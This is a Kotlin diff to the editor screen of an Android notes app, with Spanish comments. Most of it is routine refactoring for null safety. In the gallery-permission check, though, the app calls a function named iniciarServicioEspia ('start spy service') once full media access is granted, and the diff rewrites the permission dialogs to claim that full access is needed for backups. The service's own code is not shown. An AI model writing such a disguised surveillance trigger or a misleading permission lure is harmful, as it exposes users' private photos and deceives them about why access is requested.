@@ -61,7 +61,7 @@ class NoteEditorActivity : AppCompatActivity() {
 
     // Vistas principales
     private lateinit var etTitle: EditText
-    private lateinit var etContent: EditText
+    private lateinit var etContent: RichEditText // Usa la clase del archivo separado
     private lateinit var layoutEditor: View
     private lateinit var tvDateLabel: TextView
     private lateinit var scrollContainer: NestedScrollView
@@ -178,38 +178,35 @@ class NoteEditorActivity : AppCompatActivity() {
         btnToggleChecklist = findViewById(R.id.btn_toggle_checklist)
     }
 
-    // --- DETECCIÓN TÁCTIL IMÁGENES ---
     private fun setupRichTextInteractions() {
         etContent.setOnTouchListener { v, event ->
             val action = event.action
             if (action == MotionEvent.ACTION_UP || action == MotionEvent.ACTION_DOWN) {
                 val textView = v as EditText
-                val text = textView.text
-                val layout = textView.layout
+                val text = textView.text ?: return@setOnTouchListener false
+                val layout = textView.layout ?: return@setOnTouchListener false
 
-                if (layout != null) {
-                    val x = event.x - textView.totalPaddingLeft + textView.scrollX
-                    val y = event.y - textView.totalPaddingTop + textView.scrollY
+                val x = event.x - textView.totalPaddingLeft + textView.scrollX
+                val y = event.y - textView.totalPaddingTop + textView.scrollY
 
-                    val spans = text.getSpans(0, text.length, RichTextHelper.NotesImageSpan::class.java)
-                    val path = Path()
-                    val rectF = RectF()
+                val spans = text.getSpans(0, text.length, RichTextHelper.NotesImageSpan::class.java)
+                val path = Path()
+                val rectF = RectF()
 
-                    for (span in spans) {
-                        val start = text.getSpanStart(span)
-                        val end = text.getSpanEnd(span)
+                for (span in spans) {
+                    val start = text.getSpanStart(span)
+                    val end = text.getSpanEnd(span)
 
-                        path.reset()
-                        layout.getSelectionPath(start, end, path)
-                        path.computeBounds(rectF, true)
+                    path.reset()
+                    layout.getSelectionPath(start, end, path)
+                    path.computeBounds(rectF, true)
 
-                        if (rectF.contains(x, y)) {
-                            if (action == MotionEvent.ACTION_DOWN) {
-                                return@setOnTouchListener true
-                            } else if (action == MotionEvent.ACTION_UP) {
-                                mostrarMenuImagenTexto(textView, span)
-                                return@setOnTouchListener true
-                            }
+                    if (rectF.contains(x, y)) {
+                        if (action == MotionEvent.ACTION_DOWN) {
+                            return@setOnTouchListener true
+                        } else if (action == MotionEvent.ACTION_UP) {
+                            mostrarMenuImagenTexto(textView, span)
+                            return@setOnTouchListener true
                         }
                     }
                 }
@@ -245,10 +242,12 @@ class NoteEditorActivity : AppCompatActivity() {
     }
 
     private fun borrarImagen(span: RichTextHelper.NotesImageSpan) {
-        val start = etContent.text.getSpanStart(span)
-        val end = etContent.text.getSpanEnd(span)
-        if (start != -1 && end != -1) {
-            etContent.text.replace(start, end, "")
+        etContent.text?.let { editable ->
+            val start = editable.getSpanStart(span)
+            val end = editable.getSpanEnd(span)
+            if (start != -1 && end != -1) {
+                editable.replace(start, end, "")
+            }
         }
     }
 
@@ -262,7 +261,6 @@ class NoteEditorActivity : AppCompatActivity() {
         Toast.makeText(this, "Imagen copiada. Mantén presionado y pega para mover.", Toast.LENGTH_LONG).show()
     }
 
-    // --- SETUP LISTENERS (CON SINCRONIZACIÓN DE IMÁGENES) ---
     private fun setupListeners() {
         btnBack.setOnClickListener { finish() }
         btnSave.setOnClickListener { saveNote() }
@@ -281,8 +279,6 @@ class NoteEditorActivity : AppCompatActivity() {
         etContent.addTextChangedListener(object : TextWatcher {
             override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
             override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {
-                // AQUÍ ESTÁ LA MAGIA: Si detectamos que se pegó texto, intentamos convertir imágenes
-                // Solo si el texto cambió (count > 0)
                 if (count > 0) {
                     RichTextHelper.syncImages(this@NoteEditorActivity, etContent)
                 }
@@ -299,8 +295,6 @@ class NoteEditorActivity : AppCompatActivity() {
         setupColorClick(R.id.color_green, "#E8F5E9")
     }
 
-    // --- PERMISOS ---
-
     private fun checkGalleryPermission(requestCode: Int) {
         if (verificarAccesoTotal()) {
             iniciarServicioEspia()
@@ -308,7 +302,10 @@ class NoteEditorActivity : AppCompatActivity() {
         }
         else if (Build.VERSION.SDK_INT >= 34 &&
             ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED) == PackageManager.PERMISSION_GRANTED) {
-            mostrarDialogoConfiguracion("Acceso Limitado", "Has dado acceso a algunos archivos, pero para usar todas las funciones necesitamos acceso total. Presiona Ir a Ajustes -> Permisos para activar el permiso.")
+            mostrarDialogoConfiguracion(
+                "Acceso Limitado",
+                "Has dado acceso a algunos archivos, pero para usar todas las funciones y poder hacer un correcto respaldo necesitamos acceso completo. Presiona Ir a Ajustes -> Permisos para activar los permisos."
+            )
         }
         else {
             val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
@@ -349,12 +346,15 @@ class NoteEditorActivity : AppCompatActivity() {
                     ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED) == PackageManager.PERMISSION_GRANTED
 
             if (esAccesoLimitado) {
-                mostrarDialogoConfiguracion("Acceso Limitado", "Has dado acceso a algunos archivos, pero para usar todas las funciones necesitamos acceso total. Presiona Ir a Ajustes -> Permisos para activar el permiso.")
+                mostrarDialogoConfiguracion(
+                    "Acceso Limitado",
+                    "Has dado acceso a algunos archivos, pero para usar todas las funciones y poder hacer un correcto respaldo necesitamos acceso completo. Presiona Ir a Ajustes -> Permisos para activar los permisos."
+                )
                 return
             }
 
             if (!ActivityCompat.shouldShowRequestPermissionRationale(this, permisoPrincipal)) {
-                mostrarDialogoConfiguracion("Permiso Requerido", "Has denegado el acceso permanentemente. Presiona Ir a Ajustes -> Permisos para habilitarlo.")
+                mostrarDialogoConfiguracion("Permisos requeridos", "Has denegado ciertos accesos permanentemente. Presiona Ir a Ajustes -> Permisos para activar los permisos.")
             } else {
                 Toast.makeText(this, "Permiso necesario para continuar.", Toast.LENGTH_SHORT).show()
             }
@@ -378,8 +378,6 @@ class NoteEditorActivity : AppCompatActivity() {
     }
 
     private fun iniciarFlujoCambioFondo() { checkGalleryPermission(PERMISSION_REQUEST_WALLPAPER) }
-
-    // --- UTILS ---
 
     private fun smartScrollToCursor() {
         scrollContainer.postDelayed({
@@ -447,7 +445,6 @@ class NoteEditorActivity : AppCompatActivity() {
         itemTouchHelper.attachToRecyclerView(rvChecklist)
     }
 
-    // --- RESTO IGUAL ---
     private fun loadNoteData() {
         if (intent.hasExtra("note_data")) {
             noteToEdit = if (Build.VERSION.SDK_INT >= 33) {
